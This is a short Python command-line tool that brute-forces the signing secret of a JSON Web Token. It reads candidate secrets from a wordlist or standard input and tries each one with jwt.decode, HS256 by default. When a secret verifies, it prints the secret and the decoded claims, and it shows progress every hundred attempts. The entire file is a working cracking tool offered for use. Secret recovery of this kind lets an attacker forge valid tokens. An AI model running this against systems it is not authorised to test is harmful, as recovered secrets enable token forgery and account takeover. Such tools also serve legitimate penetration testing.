#!/usr/bin/python

import jwt
import sys
import argparse

RED="\033[1;31m"
GREEN="\033[1;32m"
RESET="\033[0m"


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', help='JWT Tocken', dest='tocken')
    parser.add_argument('-a', help='hashing algorithm default HS256', dest='algo')
    parser.add_argument('-w', help='word list default STDIN', dest='word_list')
    args = parser.parse_args()
    counter = 0
    token = args.tocken
    algo = args.algo or 'HS256'
    if(args.word_list):
        word_list = open(args.word_list,"r")
    else:
        word_list = sys.stdin

    sys.stdout.write(RED+" cracking token => "+RESET+token+"\n")
    for secret in word_list.readlines():
        counter += 1
        try:
            decoded = jwt.decode(token,key=secret.strip(),algorithm=algo)
            sys.stdout.write(GREEN+"[+] Secret Found  "+secret+RESET+"\n"+str(decoded))
            sys.stdout.flush()
            break
        except Exception as ops:
            # in case of wrong secret show status
            if(counter % 100 == 0):
                sys.stdout.write(str(counter)+"   "+secret.strip()+"        ")
                sys.stdout.flush()
                sys.stdout.write((b'\x08' *  ( len(str(counter))+len(secret) + 10) ).decode())

